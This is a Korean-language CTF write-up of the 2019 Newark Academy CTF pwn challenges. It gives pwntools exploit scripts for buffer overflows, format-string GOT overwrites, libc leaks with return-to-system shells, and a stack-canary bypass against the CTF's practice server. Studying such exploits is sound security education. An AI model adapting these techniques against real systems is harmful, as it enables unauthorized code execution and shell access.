---
title: "2019 Newark Academy CTF Writeup"
date: 2019-9-23
tags: [CTF]
categories: [CTF]
---

# BufferOverflow #0

리턴값만 덮어주면 된다.

```python
from pwn import *

p = remote('shell.2019.nactf.com',31475) 
payload = ''
payload += 'A'*28
payload += p32(0x080491c2)
p.sendlineafter('>',payload)
p.interactive()
```

<br />

# BufferOverflow #1

리턴값만 덮어주면 된다.

```python
from pwn import *
 
p = remote('shell.2019.nactf.com',31462)
payload = ''
payload += 'A'*28
payload += p32(0x080491b2)
p.sendlineafter('>',payload)
p.interactive()
```

<br />

# BufferOverflow #2

인자로 들어가는 a1이 long long int라 p64로 값 맞춰주면 된다. 

```python
from pwn import *
 
context.log_level = "debug"
p = remote('shell.2019.nactf.com',31184)
e = ELF('./bufover-2')
win = 0x080491c2
payload = 'A'*28
payload += p32(e.sym.win)
payload += 'AAAA'
payload += p64(0x14B4DA55)
payload += p32(0xF00DB4BE)
p.sendlineafter('>',payload)
p.interactive()
```

<br />

# Format #0

그냥 printf 포맷스트링 버그 터지는데 Leak해주면 풀린다.

```python
from pwn import *
 
for i in range(30):
    p = remote('shell.2019.nactf.com',31782)
    payload = '%' + str(i) + '$s'
    sleep(1)
    p.sendlineafter('>',payload)
    ex = p.recv(1024)
    if 'nactf' in ex:
        print ex
        p.close()
        exit(0)
    p.close()
p.interactive()
```

<br />

# Format #1

fmtstr_payload로 printf got 주소를 win으로 바꿔주면 printf 함수 실행할때 win함수가 실행되서 풀릴 것이다.

```python
from pwn import *
 
p = remote('shell.2019.nactf.com',31560)
e = ELF('./format-1')
 
payload = fmtstr_payload(4,{e.got['printf']:e.symbols['win']})
p.sendlineafter('>',payload) 
p.interactive()
```

<br />

# Loopy#0

그냥 fsb로 leak해주고 RTL해주면 된다.

```python
from pwn import *
 
context.arch='i386'
e = ELF('loopy-0')
libc = ELF('./libc.so.6')
p = remote('shell.2019.nactf.com',31283)
 
popret = 0x0804901e # pop ebx ; ret
payload = p32(e.got['printf']) + '%4$s'
payload += 'A'*(0x48+4-8)
payload += p32(e.symbols['vuln']) # ret
p.sendlineafter('>',payload)
p.recvuntil(': ')
p.recv(4)
printf = u32(p.recv(4))
log.info('printf : ' + hex(printf))
libc_base = printf - libc.symbols['printf']
log.info('libc_base : ' + hex(libc_base))
 
payload2 = 'A'*(0x48+4)
payload2 += p32(libc_base + libc.symbols['system'])
payload2 += 'AAAA'
payload2 += p32(libc_base + libc.search('/bin/sh').next())
p.sendlineafter('>',payload2)
 
p.interactive()
```

<br />

# Loopy #1

Canary 걸려잇어서 stack_chk_fail GOT를 start로 바꾸고 Leak해주면서 Canary도 Leak해주고 Canary 잘 맞춰주고 페이로드 짜면 된다.

```python
from pwn import *
 
# context.log_level = 'debug'
e = ELF('./loopy-1')
libc = ELF('./libc.so.6')
p = remote('shell.2019.nactf.com',31732)
 
__stack_chk_fail = 0x0804C014 # got
_start = 0x08049090
 
payload = fmtstr_payload(7,{__stack_chk_fail:_start})
payload += 'A'*100
p.sendlineafter('>',payload)
 
payload2 = p32(e.got['printf']) + '%7$s'
payload2 += 'A'*100
p.sendlineafter('>',payload2)
 
p.recvuntil(': ')
p.recv(4)
libc_base = u32(p.recv(4)) - libc.symbols['printf']
log.info('libc_base : ' + hex(libc_base))
system = libc_base + libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh\x00').next()
 
payload3 = '%31$p'
payload3 += 'A'*62
p.sendlineafter('>',payload3)
 
p.recvuntil(': ')
canary = int(p.recv(10),16)
log.info('canary : ' + hex(canary))
 
payload4 = 'A'*64
payload4 += p32(canary)
payload4 += 'A'*12
payload4 += p32(system)
payload4 += p32(system)
payload4 += p32(binsh)
p.sendlineafter('>',payload4)
 
p.interactive()
```

